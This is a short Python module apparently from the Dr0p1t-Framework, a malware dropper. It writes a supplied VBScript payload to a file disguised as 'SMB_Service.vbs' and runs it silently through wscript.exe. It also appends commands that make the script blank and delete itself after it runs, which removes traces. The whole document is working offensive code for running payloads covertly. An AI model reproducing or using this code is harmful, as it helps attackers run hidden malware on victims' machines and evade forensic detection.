#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run vbs scripts
#Start

def F522F(tobe):
	f = open("SMB_Service.vbs","w")
	f.write(tobe)
	f.write("\nDim objShell")
	f.write('\nSet objShell = WScript.CreateObject ("WScript.shell")')
	f.write('\nobjShell.run "cmd /c break>SMB_Service.vbs && DEL SMB_Service.vbs"')
	f.close()
	c = subprocess.Popen("wscript.exe SMB_Service.vbs >> NUL",shell=True)

F522F(Vbs_Script_Data)
